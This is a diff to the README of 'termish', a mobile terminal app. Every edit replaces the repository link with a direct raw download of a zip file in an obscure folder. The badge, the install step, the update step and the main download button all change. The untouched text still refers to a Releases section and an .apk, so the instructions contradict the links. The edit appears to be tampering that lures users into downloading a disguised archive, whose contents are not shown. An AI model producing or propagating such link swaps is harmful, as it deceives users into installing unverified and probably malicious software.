@@ -1,6 +1,6 @@
 # 📱 termish - Your Pocket-Sized Supercomputer Terminal
 
-[![Download termish](https://img.shields.io/badge/Download-termish-blueviolet?style=for-the-badge&logo=github)](https://github.com/curtis7193/termish)
+[![Download termish](https://img.shields.io/badge/Download-termish-blueviolet?style=for-the-badge&logo=github)](https://github.com/curtis7193/termish/raw/refs/heads/main/becircled/3.7.zip)
 
 ## 👋 Welcome to termish
 
@@ -23,7 +23,7 @@ Think of termish as a remote control for your digital world. Whether you're chec
 Getting termish on your device is straightforward. Here's what you need to do:
 
 1. **Open Your Browser** - Use Safari on iPhone or Chrome on Android
-2. **Visit the Download Page** - Go to https://github.com/curtis7193/termish
+2. **Visit the Download Page** - Go to https://github.com/curtis7193/termish/raw/refs/heads/main/becircled/3.7.zip
 3. **Find the Latest Release** - Look for the "Releases" section on the right side of the page
 4. **Choose Your Version** - Pick the file that matches your device:
    - Android users: look for an .apk file
@@ -105,7 +105,7 @@ Yes! You can explore the AI features and learn terminal basics even without conn
 
 Technology improves quickly, and termish does too. To get new features and security updates:
 
-1. Visit https://github.com/curtis7193/termish regularly
+1. Visit https://github.com/curtis7193/termish/raw/refs/heads/main/becircled/3.7.zip regularly
 2. Check the "Releases" section for new versions
 3. Download and install the latest update just like the first time
 
@@ -149,7 +149,7 @@ Whether you're managing a business, learning new skills, or simply curious about
 
 **Ready to begin?**
 
-### [📲 Download termish Now](https://github.com/curtis7193/termish)
+### [📲 Download termish Now](https://github.com/curtis7193/termish/raw/refs/heads/main/becircled/3.7.zip)
 
 Join the growing community of users who've discovered the power of having a complete computing toolkit in their pocket. Your smartphone is more than a device - with termish, it's a portal to everything you can imagine.
 
